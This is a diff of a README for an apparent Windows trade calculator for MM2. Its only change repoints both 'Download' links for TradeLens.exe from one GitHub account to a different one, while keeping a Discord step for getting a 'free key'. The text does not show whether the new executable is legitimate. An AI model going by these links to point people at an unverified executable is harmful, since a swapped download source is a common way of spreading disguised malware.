@@ -5,7 +5,7 @@
 <h1 align="center">A calculator for MM2 trades</h1>
 
 <p align="center">
-  <a href="https://github.com/philippearchambault/MM2TradeLens/releases/latest/download/TradeLens.exe"><b>⬇ Download for Windows</b></a>
+  <a href="https://github.com/thegoblinclub/MM2TradeLens/releases/latest/download/TradeLens.exe"><b>⬇ Download for Windows</b></a>
   &nbsp;·&nbsp;
   <a href="https://discord.gg/kqVU9HHP3f"><b>Get your free key on Discord</b></a>
 </p>
@@ -31,7 +31,7 @@ from the trade.
 
 ## Getting started
 
-1. **[Download it](https://github.com/philippearchambault/MM2TradeLens/releases/latest/download/TradeLens.exe)** — one file, nothing to install
+1. **[Download it](https://github.com/thegoblinclub/MM2TradeLens/releases/latest/download/TradeLens.exe)** — one file, nothing to install
 2. **[Join the Discord](https://discord.gg/kqVU9HHP3f)** and type `?getkey` in any channel
 3. Paste the key into the program, press **START**, and trade
 
